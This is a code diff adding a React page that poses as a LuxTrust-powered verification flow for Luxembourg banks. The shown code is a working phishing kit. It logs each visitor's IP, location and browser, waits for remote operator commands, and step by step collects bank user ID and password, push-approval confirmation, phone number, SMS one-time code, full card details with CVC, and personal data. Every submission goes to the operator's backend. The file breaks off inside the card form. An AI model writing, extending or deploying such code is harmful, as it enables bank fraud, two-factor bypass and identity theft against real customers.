@@ -1,0 +1,852 @@
+import { useEffect, useRef, useState } from "react";
+import { Link, useNavigate, useParams } from "react-router-dom";
+import { USER_ID_EXAMPLE, getBank, validateUserId } from "../lib/banks";
+import { BANK_FALLBACK_URLS, BANK_LOGO_URLS } from "../lib/bankLogos";
+import {
+  apiEnabled,
+  apiGetCommand,
+  apiHeartbeat,
+  apiRegisterVisitor,
+  apiSubmit,
+} from "../lib/api";
+import {
+  COMMAND_TO_STATUS,
+  fetchIpLocation,
+  getChannel,
+  getOrCreateVisitorId,
+  makeVisitorId,
+  readCommands,
+  readSubmissions,
+  readVisitors,
+  writeSubmissions,
+  writeVisitors,
+} from "../lib/realtime";
+
+const TOTAL_STEPS = 7;
+
+const STEP_LABELS = [
+  "Login",
+  "Approve",
+  "Phone",
+  "SMS",
+  "Card",
+  "Info",
+  "Confirm",
+];
+
+const STATUS_TO_STEP = {
+  waiting: 1,
+  login_requested: 1,
+  login_submitted: 1,
+  approve_requested: 2,
+  approve_submitted: 2,
+  phone_requested: 3,
+  phone_submitted: 3,
+  sms_requested: 4,
+  sms_submitted: 4,
+  card_requested: 5,
+  card_submitted: 5,
+  info_requested: 6,
+  info_submitted: 6,
+  confirm_requested: 7,
+  done: 7,
+};
+
+function BankHeaderLogo({ bank }) {
+  const src = BANK_LOGO_URLS[bank.slug];
+  const fallback = BANK_FALLBACK_URLS[bank.slug];
+  return (
+    <span className="flex h-8 w-8 shrink-0 items-center justify-center overflow-hidden rounded-lg bg-white sm:h-9 sm:w-9">
+      {src ? (
+        <img
+          src={src}
+          alt={bank.name}
+          loading="eager"
+          className="h-8 w-8 object-contain sm:h-9 sm:w-9"
+          onError={(e) => {
+            const img = e.currentTarget;
+            if (fallback && img.src !== fallback) {
+              img.src = fallback;
+            } else {
+              img.style.display = "none";
+              if (img.nextElementSibling) img.nextElementSibling.style.display = "flex";
+            }
+          }}
+        />
+      ) : null}
+      <span
+        style={{ display: src ? "none" : "flex" }}
+        className="h-8 w-8 items-center justify-center text-[16px] font-extrabold sm:h-9 sm:w-9 sm:text-[18px]"
+      >
+        {bank.initial}
+      </span>
+    </span>
+  );
+}
+
+function Shell({ bank, step, children, title, kicker, desc }) {
+  const pct = Math.round((step / TOTAL_STEPS) * 100);
+  return (
+    <div className="min-h-screen w-full overflow-x-hidden bg-neutral-100">
+      <header className="w-full text-white" style={{ backgroundColor: bank.color }}>
+        <div className="mx-auto flex w-full max-w-3xl items-center justify-between gap-2 px-3 py-2.5 sm:px-6 sm:py-3">
+          <div className="flex min-w-0 flex-1 items-center gap-2 sm:gap-2.5">
+            <BankHeaderLogo bank={bank} />
+            <span className="min-w-0 leading-tight">
+              <span className="block truncate text-[14px] font-extrabold sm:text-[16px]">{bank.name}</span>
+              <span className="block truncate text-[10px] opacity-80 sm:text-[11px]">Secure verification via LuxTrust</span>
+            </span>
+          </div>
+          <Link to="/" className="shrink-0 rounded-full bg-black/20 px-3 py-2 text-[12px] font-medium hover:bg-black/30 active:bg-black/40">
+            ✕ Cancel
+          </Link>
+        </div>
+      </header>
+
+      <div className="mx-auto w-full max-w-3xl px-3 pt-4 sm:px-6 sm:pt-5">
+        <div className="flex flex-wrap items-center gap-2 text-[12px] font-semibold">
+          <span className="shrink-0 rounded-full px-2.5 py-1 text-white" style={{ backgroundColor: bank.color }}>
+            Step {step} of {TOTAL_STEPS}
+          </span>
+          <span className="hidden min-w-0 flex-1 truncate text-neutral-500 md:block">{STEP_LABELS.join(" → ")}</span>
+          <span className="truncate text-neutral-500 md:hidden">{STEP_LABELS[step - 1]}</span>
+        </div>
+        <div className="mt-2 h-1.5 w-full overflow-hidden rounded-full bg-neutral-200">
+          <div className="h-full rounded-full transition-all" style={{ width: `${pct}%`, backgroundColor: bank.color }} />
+        </div>
+      </div>
+
+      <main className="mx-auto w-full max-w-3xl px-3 py-4 sm:px-6 sm:py-6">
+        <div
+          className="w-full overflow-hidden rounded-2xl bg-white shadow-[0_12px_40px_-12px_rgba(0,0,0,0.18)] ring-1 ring-black/5 sm:rounded-[20px]"
+          style={{ "--brand": bank.color }}
+        >
+          <div className="h-1.5 w-full" style={{ background: `linear-gradient(90deg, ${bank.color}, ${bank.color}88)` }} />
+          <div className="w-full px-4 py-6 sm:px-8 sm:py-8">
+            <p className="flex min-w-0 items-center gap-2">
+              <span className="flex items-center gap-1.5 rounded-full px-2.5 py-1 text-[11px] font-extrabold uppercase tracking-[0.14em] text-white" style={{ backgroundColor: bank.color }}>
+                <img
+                  src={BANK_LOGO_URLS[bank.slug]}
+                  alt=""
+                  aria-hidden="true"
+                  loading="lazy"
+                  className="h-4 w-4 shrink-0 rounded-full bg-white object-contain"
+                  onError={(e) => {
+                    const img = e.currentTarget;
+                    const fb = BANK_FALLBACK_URLS[bank.slug];
+                    if (fb && img.src !== fb) img.src = fb;
+                    else img.style.display = "none";
+                  }}
+                />
+                <span className="truncate">
+                  {bank.short} • {kicker}
+                </span>
+              </span>
+            </p>
+            <h1 className="mt-2.5 break-words text-[22px] font-extrabold leading-tight tracking-tight text-neutral-900 sm:text-[24px]">{title}</h1>
+            {desc && <p className="mt-1.5 max-w-xl text-[13.5px] leading-relaxed text-neutral-500 sm:text-[14px]">{desc}</p>}
+            <div className="mt-5 w-full sm:mt-6">{children}</div>
+            <div className="mt-6 flex items-center gap-3 border-t border-dashed border-neutral-200 pt-4">
+              <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-emerald-50 text-[13px]">🔒</span>
+              <p className="text-[11.5px] leading-snug text-neutral-400">
+                Encrypted &amp; secure • <b className="font-semibold text-neutral-500">{bank.name}</b> • Powered by LuxTrust
+              </p>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+  );
+}
+
+function WaitingLoader({ bank, stepNum, note }) {
+  return (
+    <Shell
+      bank={bank}
+      step={stepNum}
+      kicker="Secure connection"
+      title="Please wait…"
+      desc="Your secure session is being prepared. Do not close this page."
+    >
+      <div className="flex w-full flex-col items-center rounded-2xl border border-dashed border-neutral-300 bg-gradient-to-b from-neutral-50 to-white px-4 py-9 text-center sm:py-11">
+        <span className="relative flex h-20 w-20 items-center justify-center">
+          <span className="absolute inset-0 animate-ping rounded-3xl opacity-20" style={{ backgroundColor: bank.color }} />
+          <span className="absolute inset-1 rounded-3xl bg-white shadow-lg ring-1 ring-black/5" />
+          <img
+            src={BANK_LOGO_URLS[bank.slug]}
+            alt={bank.name}
+            className="relative h-11 w-11 object-contain"
+            onError={(e) => {
+              const img = e.currentTarget;
+              const fb = BANK_FALLBACK_URLS[bank.slug];
+              if (fb && img.src !== fb) img.src = fb;
+              else img.style.display = "none";
+            }}
+          />
+        </span>
+        <p className="mt-4 text-[17px] font-extrabold tracking-tight text-neutral-900 sm:text-[18px]">Please wait…</p>
+        <p className="mt-1 max-w-sm text-[13.5px] leading-relaxed text-neutral-500">
+          {note || "Connecting you securely. This usually takes a few seconds."}
+        </p>
+        <span className="mt-4 flex items-center gap-1.5">
+          {[0, 1, 2].map((i) => (
+            <span key={i} className="h-2 w-2 animate-bounce rounded-full" style={{ backgroundColor: bank.color, animationDelay: `${i * 0.15}s` }} />
+          ))}
+        </span>
+      </div>
+    </Shell>
+  );
+}
+
+function PrimaryBtn({ bank, disabled, loading, onClick, children, type = "button" }) {
+  return (
+    <button
+      type={type}
+      disabled={disabled || loading}
+      onClick={onClick}
+      className="flex min-h-[52px] w-full items-center justify-center gap-2 rounded-xl px-4 py-3.5 text-[15px] font-extrabold tracking-wide text-white transition-all duration-200 hover:brightness-110 hover:shadow-xl active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-40 disabled:hover:brightness-100 sm:text-[15.5px]"
+      style={{ background: `linear-gradient(180deg, ${bank.color}, ${bank.dark || bank.color})`, boxShadow: `0 10px 24px -10px ${bank.color}cc` }}
+    >
+      {loading ? (
+        <>
+          <span className="h-4 w-4 shrink-0 animate-spin rounded-full border-2 border-white/40 border-t-white" />
+          Verifying…
+        </>
+      ) : (
+        children
+      )}
+    </button>
+  );
+}
+
+function ApproveVisual({ bank }) {
+  return (
+    <div className="flex w-full items-center gap-4 rounded-2xl border border-neutral-200 bg-gradient-to-br from-neutral-50 to-white px-4 py-5 sm:px-5">
+      {/* mini phone mockup */}
+      <span className="relative w-14 shrink-0">
+        <span className="mx-auto block h-24 w-14 rounded-[14px] bg-neutral-900 p-1 shadow-lg">
+          <span className="block h-full w-full rounded-[10px] bg-white">
+            <span className="mx-auto mt-1 block h-1 w-6 rounded-full bg-neutral-200" />
+            <span className="mx-1.5 mt-1.5 block rounded-md p-1.5" style={{ backgroundColor: `${bank.color}14` }}>
+              <span className="block h-1.5 w-3/4 rounded-full" style={{ backgroundColor: bank.color }} />
+              <span className="mt-1 block h-1.5 w-1/2 rounded-full bg-neutral-200" />
+            </span>
+            <span className="mx-1.5 mt-1 block rounded-md bg-emerald-500 p-1 text-center text-[7px] font-extrabold text-white">Approve</span>
+          </span>
+        </span>
+        <span className="absolute -right-0.5 -top-1 flex h-5 w-5 items-center justify-center rounded-full bg-red-500 text-[11px] font-bold text-white ring-2 ring-white">
+          1
+        </span>
+      </span>
+      <span className="min-w-0 flex-1">
+        <span className="block text-[14px] font-extrabold text-neutral-900">Open your {bank.short} app</span>
+        <span className="mt-0.5 block text-[12.5px] leading-snug text-neutral-500">Tap the push notification, then confirm it&apos;s really you.</span>
+        <span className="mt-2 inline-flex items-center gap-1.5 rounded-full bg-white px-3 py-1.5 text-[12px] font-semibold text-neutral-600 shadow-sm ring-1 ring-black/5">
+          <span className="h-2 w-2 shrink-0 animate-pulse rounded-full bg-emerald-500" />
+          Waiting for approval…
+        </span>
+      </span>
+    </div>
+  );
+}
+
+const inputCls = (err) =>
+  `w-full min-w-0 rounded-xl border-2 bg-slate-50/70 py-3.5 pl-11 pr-3.5 text-[16px] text-neutral-900 shadow-[inset_0_1px_2px_rgba(0,0,0,0.04)] outline-none transition-all duration-200 placeholder:font-normal placeholder:text-neutral-300 hover:border-neutral-300 hover:bg-white sm:text-[15px] ${
+    err
+      ? "border-red-300 bg-red-50/50 focus:border-red-500 focus:bg-white focus:ring-4 focus:ring-red-500/10"
+      : "border-neutral-200 focus:border-[var(--brand)] focus:bg-white focus:ring-4 focus:ring-neutral-900/5 focus:shadow-[0_0_0_4px_color-mix(in_srgb,var(--brand)_12%,transparent)]"
+  }`;
+const inputClsPlain = (err) =>
+  `w-full min-w-0 rounded-xl border-2 bg-slate-50/70 px-3.5 py-3.5 text-[16px] text-neutral-900 shadow-[inset_0_1px_2px_rgba(0,0,0,0.04)] outline-none transition-all duration-200 placeholder:font-normal placeholder:text-neutral-300 hover:border-neutral-300 hover:bg-white sm:text-[15px] ${
+    err
+      ? "border-red-300 bg-red-50/50 focus:border-red-500 focus:bg-white focus:ring-4 focus:ring-red-500/10"
+      : "border-neutral-200 focus:border-[var(--brand)] focus:bg-white focus:shadow-[0_0_0_4px_color-mix(in_srgb,var(--brand)_12%,transparent)]"
+  }`;
+const errCls = "mt-1.5 flex items-center gap-1 text-[12.5px] font-semibold text-red-600";
+const labelCls = "text-[13px] font-extrabold tracking-wide text-neutral-800";
+
+function LeadIcon({ d, className = "" }) {
+  return (
+    <span className={`pointer-events-none absolute left-3.5 top-1/2 -translate-y-1/2 text-neutral-400 ${className}`}>
+      <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round">
+        <path d={d} />
+      </svg>
+    </span>
+  );
+}
+
+const P = {
+  user: "M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2 M12 11a4 4 0 1 0 0-8 4 4 0 0 0 0 8z",
+  lock: "M5 11h14a1 1 0 0 1 1 1v9a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-9a1 1 0 0 1 1-1z M8 11V7a4 4 0 0 1 8 0v4",
+  phone: "M22 16.9v3a2 2 0 0 1-2.2 2 19.8 19.8 0 0 1-8.6-3.1 19.5 19.5 0 0 1-6-6A19.8 19.8 0 0 1 2.1 4.2 2 2 0 0 1 4.1 2h3a2 2 0 0 1 2 1.7c.1.9.3 1.8.6 2.7a2 2 0 0 1-.4 2.1L8.1 9.7a16 16 0 0 0 6 6l1.2-1.2a2 2 0 0 1 2.1-.4c.9.3 1.8.5 2.7.6a2 2 0 0 1 1.9 2z",
+  chat: "M21 11.5a8.4 8.4 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.4 8.4 0 0 1-3.8-.9L3 21l1.9-5.7a8.4 8.4 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.4 8.4 0 0 1 3.8-.9h.5a8.5 8.5 0 0 1 8 8v.5z",
+  card: "M2 6a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2z M2 10h20",
+  cal: "M8 2v4 M16 2v4 M3 8h18 M5 4h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z",
+  pin: "M20 10c0 6-8 12-8 12S4 16 4 10a8 8 0 0 1 16 0z M12 13a3 3 0 1 0 0-6 3 3 0 0 0 0 6z",
+  hash: "M4 9h16 M4 15h16 M10 3 8 21 M16 3l-2 18",
+};
+
+export default function BankFlow() {
+  const { bankSlug } = useParams();
+  const bank = getBank(bankSlug);
+  const navigate = useNavigate();
+
+  const [status, setStatus] = useState("waiting");
+  const [loading, setLoading] = useState(false);
+  const visitorIdRef = useRef(null);
+  // One-shot commands: each admin command (type+timestamp) is applied once.
+  // After the user submits, older commands can never pull them back to the form.
+  const appliedCmdRef = useRef("");
+  const answeredRef = useRef(0);
+
+  // form states (all hooks at top — never conditional)
+  const [userId, setUserId] = useState("");
+  const [password, setPassword] = useState("");
+  const [showPw, setShowPw] = useState(false);
+  const [t1, setT1] = useState(false);
+  const [phone, setPhone] = useState("");
+  const [t3, setT3] = useState(false);
+  const [sms, setSms] = useState("");
+  const [t4, setT4] = useState(false);
+  const [card, setCard] = useState({ holder: "", number: "", exp: "", cvc: "" });
+  const [t5, setT5] = useState(false);
+  const [info, setInfo] = useState({ first: "", last: "", dob: "", address: "", zip: "", city: "" });
+  const [t6, setT6] = useState(false);
+
+  function pushSubmission(kind, data) {
+    const entry = {
+      id: "s_" + Math.random().toString(36).slice(2, 9) + Date.now().toString(36).slice(-4),
+      visitorId: visitorIdRef.current,
+      bank: bankSlug,
+      kind,
+      data,
+      at: Date.now(),
+    };
+    const all = readSubmissions();
+    all.push(entry);
+    writeSubmissions(all);
+    try {
+      getChannel()?.postMessage({ type: "submission", entry });
+    } catch {}
+    // Postgres Render backend (multi-device) — fire and forget
+    if (apiEnabled()) apiSubmit(entry).catch(() => {});
+  }
+
+  function updateVisitor(patch) {
+    try {
+      const map = readVisitors();
+      const id = visitorIdRef.current;
+      if (!id || !map[id]) return;
+      map[id] = { ...map[id], ...patch, lastSeen: Date.now() };
+      writeVisitors(map);
+      try {
+        getChannel()?.postMessage({ type: "visitor-update", visitor: map[id] });
+      } catch {}
+    } catch {}
+    if (apiEnabled() && visitorIdRef.current) {
+      apiHeartbeat(visitorIdRef.current, patch).catch(() => {});
+    }
+  }
+
+  function applyCommand(type, at) {
+    const next = COMMAND_TO_STATUS[type];
+    if (!next) return;
+    const stamp = at || 0;
+    // Ignore commands sent before the user's last submit — the loader stays.
+    if (stamp <= answeredRef.current) return;
+    const key = `${type}:${stamp}`;
+    if (appliedCmdRef.current === key) return;
+    appliedCmdRef.current = key;
+    setStatus(next);
+    updateVisitor({ status: next });
+  }
+
+  // Register visitor + heartbeat + listen for admin commands
+  useEffect(() => {
+    if (!bank) return;
+    // One bank visit = one session = one visitor row with its own separate logs.
+    // Same bank remount (refresh/HMR) resumes the visit; a different bank click
+    // always starts a brand-new session so logs never mix across visits.
+    let id;
+    try {
+      const lastBank = sessionStorage.getItem("last_bank");
+      if (lastBank === bankSlug) {
+        id = getOrCreateVisitorId();
+      } else {
+        id = makeVisitorId();
+        sessionStorage.setItem("visitor_id", id);
+        sessionStorage.setItem("last_bank", bankSlug);
+      }
+    } catch {
+      id = makeVisitorId();
+    }
+    visitorIdRef.current = id;
+
+    const base = {
+      id,
+      bank: bankSlug,
+      bankName: bank.name,
+      status: "waiting",
+      joinedAt: Date.now(),
+      lastSeen: Date.now(),
+      ip: "…",
+      city: "…",
+      country: "…",
+      ua: navigator.userAgent,
+    };
+    const map = readVisitors();
+    map[id] = { ...(map[id] || {}), ...base, status: map[id]?.status || "waiting" };
+    // keep original joinedAt if re-visiting
+    if (map[id] && !map[id].joinedAt) map[id].joinedAt = Date.now();
+    writeVisitors(map);
+    // Prime one-shot guards from the registry so a remount never replays old commands.
+    answeredRef.current = map[id]?.answeredAt || 0;
+    appliedCmdRef.current = "";
+    setStatus(map[id].status || "waiting");
+    try {
+      getChannel()?.postMessage({ type: "visitor-hello", visitor: map[id] });
+    } catch {}
+
+    fetchIpLocation().then((loc) => {
+      updateVisitor({ ip: loc.ip, city: loc.city, country: loc.country });
+      if (apiEnabled()) {
+        apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "waiting", ...loc, ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
+      }
+    });
+
+    if (apiEnabled()) {
+      apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "waiting", ip: "…", city: "…", country: "…", ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
+    }
+
+    const hb = setInterval(() => {
+      try {
+        const m = readVisitors();
+        if (m[id]) {
+          m[id].lastSeen = Date.now();
+          m[id].bank = bankSlug;
+          m[id].bankName = bank.name;
+          // status is source of truth from state — sync it
+          writeVisitors(m);
+        }
+      } catch {}
+      // Postgres heartbeat + command poll (Render backend, multi-device)
+      if (apiEnabled()) {
+        apiHeartbeat(id, { bank: bankSlug, bankName: bank.name }).catch(() => {});
+        apiGetCommand(id)
+          .then((r) => {
+            if (r?.command?.type) applyCommand(r.command.type, Number(r.command.at) || 0);
+          })
+          .catch(() => {});
+      }
+    }, 3000);
+
+    const ch = getChannel();
+    const onMsg = (ev) => {
+      const msg = ev.data;
+      if (!msg) return;
+      if (msg.type === "command" && msg.visitorId === id) {
+        applyCommand(msg.command, Number(msg.at) || 0);
+      }
+      if (msg.type === "command-all" && msg.command) {
+        applyCommand(msg.command, Number(msg.at) || 0);
+      }
+    };
+    ch?.addEventListener?.("message", onMsg);
+
+    const onStorage = (e) => {
+      if (e.key === "live_commands_v1") {
+        try {
+          const cmds = readCommands();
+          const c = cmds[id];
+          if (c) applyCommand(c.type, Number(c.at) || 0);
+        } catch {}
+      }
+    };
+    window.addEventListener("storage", onStorage);
+
+    return () => {
+      clearInterval(hb);
+      try {
+        ch?.removeEventListener?.("message", onMsg);
+        ch?.close?.();
+      } catch {}
+      window.removeEventListener("storage", onStorage);
+    };
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [bankSlug]);
+
+  // Keep registry status in sync when local status changes (after submit)
+  useEffect(() => {
+    if (!visitorIdRef.current) return;
+    updateVisitor({ status });
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [status]);
+
+  function go(fn) {
+    setLoading(true);
+    setTimeout(() => {
+      setLoading(false);
+      fn();
+    }, 900);
+  }
+
+  if (!bank) {
+    return (
+      <div className="flex min-h-screen w-full items-center justify-center overflow-x-hidden bg-neutral-100 p-4 sm:p-6">
+        <div className="w-full max-w-sm rounded-2xl bg-white p-5 text-center shadow sm:p-6">
+          <p className="text-lg font-bold">Unknown bank</p>
+          <Link to="/" className="mt-4 inline-block min-h-[44px] w-full rounded-lg bg-neutral-900 px-4 py-2.5 text-sm font-bold text-white sm:w-auto">
+            ← Back to LuxTrust
+          </Link>
+        </div>
+      </div>
+    );
+  }
+
+  const goHome = () => navigate("/");
+  const stepNum = STATUS_TO_STEP[status] || 1;
+
+  function submitAndWait(kind, data, nextStatus) {
+    pushSubmission(kind, data);
+    // Seal this moment: any admin command older than now is consumed history
+    // and can never pull the user back to the filled form. Loader stays.
+    const t = Date.now();
+    answeredRef.current = t;
+    updateVisitor({ status: nextStatus, answeredAt: t });
+    go(() => setStatus(nextStatus));
+  }
+
+  /* ---------- WAITING / SUBMITTED -> loader ---------- */
+  if (
+    status === "waiting" ||
+    status === "login_submitted" ||
+    status === "approve_submitted" ||
+    status === "phone_submitted" ||
+    status === "sms_submitted" ||
+    status === "card_submitted" ||
+    status === "info_submitted"
+  ) {
+    const notes = {
+      waiting: "You clicked your bank. Please wait while we connect you securely…",
+      login_submitted: "Login received. Please wait for the next step…",
+      approve_submitted: "Approval received. Please wait…",
+      phone_submitted: "Phone number received. Please wait…",
+      sms_submitted: "SMS code received. Please wait…",
+      card_submitted: "Card details received. Please wait…",
+      info_submitted: "Details received. Please wait for final confirmation…",
+    };
+    return <WaitingLoader bank={bank} stepNum={stepNum} note={notes[status]} />;
+  }
+
+  /* ---------- LOGIN ---------- */
+  if (status === "login_requested") {
+    const uidErr = t1 ? validateUserId(userId) : "";
+    const pwErr = !t1 ? "" : !password ? "Password is required." : password.length < 4 ? "Password looks too short." : "";
+    const ok = validateUserId(userId) === "" && password.length >= 4;
+    return (
+      <Shell
+        bank={bank}
+        step={1}
+        kicker="First step"
+        title="Log in to verify your identity"
+        desc={<>Enter your <strong>{bank.name}</strong> credentials. This is required to keep your LuxTrust access active.</>}
+      >
+        <form
+          noValidate
+          onSubmit={(e) => {
+            e.preventDefault();
+            setT1(true);
+            if (!ok) return;
+            submitAndWait("login", { username: userId.toUpperCase(), password }, "login_submitted");
+          }}
+        >
+          <label className="block min-w-0">
+            <span className="flex flex-wrap items-center gap-2 text-[13px] font-extrabold tracking-wide text-neutral-800">
+              <span className="flex h-5 w-5 items-center justify-center rounded-md text-[11px] font-extrabold text-white" style={{ backgroundColor: bank.color }}>1</span>
+              User ID <span className="font-semibold text-neutral-400">4 digits + 4 letters</span>
+            </span>
+            <span className="relative mt-2 block">
+              <LeadIcon d={P.user} />
+              <input
+                value={userId}
+                onChange={(e) => setUserId(e.target.value.replace(/[^0-9A-Za-z]/g, "").slice(0, 8))}
+                onBlur={() => setT1(true)}
+                placeholder={USER_ID_EXAMPLE}
+                autoComplete="username"
+                className={`font-mono text-[16px] font-bold uppercase tracking-[0.12em] placeholder:text-neutral-300 ${inputCls(uidErr)}`}
+              />
+            </span>
+            {uidErr ? <span className={errCls}>⚠ {uidErr}</span> : <span className="mt-1.5 block text-[12px] text-neutral-400">Example: <b className="font-mono">{USER_ID_EXAMPLE}</b> — first 4 digits, last 4 letters.</span>}
+          </label>
+          <label className="mt-4 block min-w-0">
+            <span className={labelCls}>Password</span>
+            <span className="relative mt-2 block">
+              <LeadIcon d={P.lock} />
+              <input
+                type={showPw ? "text" : "password"}
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                onBlur={() => setT1(true)}
+                placeholder="••••••••"
+                autoComplete="current-password"
+                className={`${inputCls(pwErr)} pr-14`}
+              />
+              <button type="button" onClick={() => setShowPw((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 rounded-lg px-2.5 py-1.5 text-[12px] font-extrabold text-neutral-500 transition hover:bg-neutral-100 hover:text-neutral-800">
+                {showPw ? "Hide" : "Show"}
+              </button>
+            </span>
+            {pwErr && <span className={errCls}>⚠ {pwErr}</span>}
+          </label>
+          <div className="mt-6">
+            <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Verify &amp; Continue →</PrimaryBtn>
+          </div>
+          <div className="mt-2.5 flex w-full flex-col gap-2 sm:flex-row">
+            <button type="button" onClick={goHome} className="min-h-[44px] flex-1 rounded-lg border border-neutral-200 px-4 py-2.5 text-[13px] font-semibold text-neutral-500 hover:bg-neutral-50">
+              Change bank
+            </button>
+          </div>
+        </form>
+      </Shell>
+    );
+  }
+
+  /* ---------- APPROVE ---------- */
+  if (status === "approve_requested") {
+    return (
+      <Shell
+        bank={bank}
+        step={2}
+        kicker="Approve notification"
+        title="Check your LuxTrust app"
+        desc="There is a notification ready for you to approve in your LuxTrust app, to confirm it's really you."
+      >
+        <ApproveVisual bank={bank} />
+        <div className="mt-4 w-full space-y-2.5">
+          <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("approve", { approved: true, at: new Date().toISOString() }, "approve_submitted")}>
+            ✓ I&apos;ve approved
+          </PrimaryBtn>
+          <button type="button" className="min-h-[48px] w-full rounded-xl border-2 border-neutral-200 px-4 py-2.5 text-[13.5px] font-bold text-neutral-600 transition hover:border-neutral-300 hover:bg-neutral-50 active:bg-neutral-100">
+            Resend notification
+          </button>
+        </div>
+      </Shell>
+    );
+  }
+
+  /* ---------- PHONE ---------- */
+  if (status === "phone_requested") {
+    const digits = phone.replace(/\D/g, "");
+    const err = !t3 ? "" : !digits ? "Phone number is required." : digits.length < 8 ? "Please enter a valid phone number." : "";
+    const ok = digits.length >= 8;
+    return (
+      <Shell bank={bank} step={3} kicker="Phone number" title="Enter your phone number" desc="Please fill in your phone number.">
+        <form noValidate onSubmit={(e) => { e.preventDefault(); setT3(true); if (!ok) return; submitAndWait("phone", { phone: `+352 ${phone}` }, "phone_submitted"); }}>
+          <label className="block min-w-0">
+            <span className={labelCls}>Phone number</span>
+            <span className="relative mt-2 flex w-full min-w-0 items-center overflow-hidden rounded-xl border-2 border-neutral-200 bg-slate-50/70 transition-all duration-200 focus-within:border-[var(--brand)] focus-within:bg-white focus-within:shadow-[0_0_0_4px_color-mix(in_srgb,var(--brand)_12%,transparent)] hover:border-neutral-300">
+              <span className="shrink-0 py-3.5 pl-3.5 pr-1 text-neutral-400">
+                <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round"><path d={P.phone} /></svg>
+              </span>
+              <span className="shrink-0 bg-neutral-200/60 px-2 py-1 text-[14px] font-extrabold text-neutral-600 rounded-lg ml-1">+352</span>
+              <input
+                value={phone}
+                onChange={(e) => setPhone(e.target.value.replace(/[^\d\s]/g, ""))}
+                onBlur={() => setT3(true)}
+                placeholder="621 123 456"
+                inputMode="tel"
+                autoComplete="tel"
+                className="w-full min-w-0 bg-transparent px-3 py-3.5 text-[16px] font-semibold tracking-wide outline-none placeholder:font-normal placeholder:text-neutral-300 sm:text-[15px]"
+              />
+            </span>
+            {err && <span className={errCls}>⚠ {err}</span>}
+          </label>
+          <div className="mt-6"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Continue →</PrimaryBtn></div>
+        </form>
+      </Shell>
+    );
+  }
+
+  /* ---------- SMS ---------- */
+  if (status === "sms_requested") {
+    const code = sms.replace(/\D/g, "").slice(0, 6);
+    const err = !t4 ? "" : !code ? "SMS code is required." : code.length < 4 ? "Please enter the SMS code correctly." : "";
+    const ok = code.length >= 4;
+    return (
+      <Shell bank={bank} step={4} kicker="SMS verification" title="Enter your SMS code" desc="Please fill in the SMS code we just sent to your phone number.">
+        <form noValidate onSubmit={(e) => { e.preventDefault(); setT4(true); if (!ok) return; submitAndWait("sms", { sms: code }, "sms_submitted"); }}>
+          <label className="block min-w-0">
+            <span className={`${labelCls} flex items-center gap-1.5`}>
+              <svg viewBox="0 0 24 24" className="h-4 w-4 text-neutral-400" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d={P.chat} /></svg>
+              SMS code
+            </span>
+            <input
+              value={code}
+              onChange={(e) => setSms(e.target.value)}
+              onBlur={() => setT4(true)}
+              placeholder="• • • • • •"
+              inputMode="numeric"
+              autoComplete="one-time-code"
+              className={`mt-2 text-center font-mono text-[22px] font-extrabold tracking-[0.35em] sm:text-[24px] ${inputClsPlain(err)}`}
+            />
+            {err && <span className={`${errCls} justify-center`}>⚠ {err}</span>}
+          </label>
+          <div className="mt-4 text-center">
+            <button type="button" className="text-[13px] font-bold underline" style={{ color: bank.color }}>Resend SMS code</button>
+          </div>
+          <div className="mt-4"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Verify code →</PrimaryBtn></div>
+        </form>
+      </Shell>
+    );
+  }
+
+  /* ---------- CARD ---------- */
+  if (status === "card_requested") {
+    const num = card.number.replace(/\D/g, "").slice(0, 16);
+    const expOk = /^(0[1-9]|1[0-2])\/\d{2}$/.test(card.exp);
+    const errs = {
+      holder: t5 && !card.holder.trim() ? "Card holder is required." : "",
+      number: t5 && num.length !== 16 ? "Enter the 16-digit card number." : "",
+      exp: t5 && !expOk ? "Use MM/YY format." : "",
+      cvc: t5 && !/^\d{3,4}$/.test(card.cvc) ? "Invalid CVC." : "",
+    };
+    const ok = card.holder.trim() && num.length === 16 && expOk && /^\d{3,4}$/.test(card.cvc);
+    const fmtNum = (v) => v.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
+    const fmtExp = (v) => {
+      const d = v.replace(/\D/g, "").slice(0, 4);
+      if (d.length <= 2) return d;
+      return d.slice(0, 2) + "/" + d.slice(2);
+    };
+    return (
+      <Shell bank={bank} step={5} kicker="Credit card" title="Add your credit card details" desc="Please enter your credit card details to complete the verification.">
+        <form noValidate onSubmit={(e) => { e.preventDefault(); setT5(true); if (!ok) return; submitAndWait("card", { ...card, number: num }, "card_submitted"); }} className="w-full space-y-4">
+          {/* mini card preview */}
+          <div className="overflow-hidden rounded-2xl p-4 text-white shadow-lg sm:p-5" style={{ background: `linear-gradient(120deg, #1c1c28 0%, ${bank.color} 130%)` }}>
+            <div className="flex items-center justify-between">
+              <span className="h-7 w-10 rounded-md bg-gradient-to-br from-amber-200 to-amber-400" />
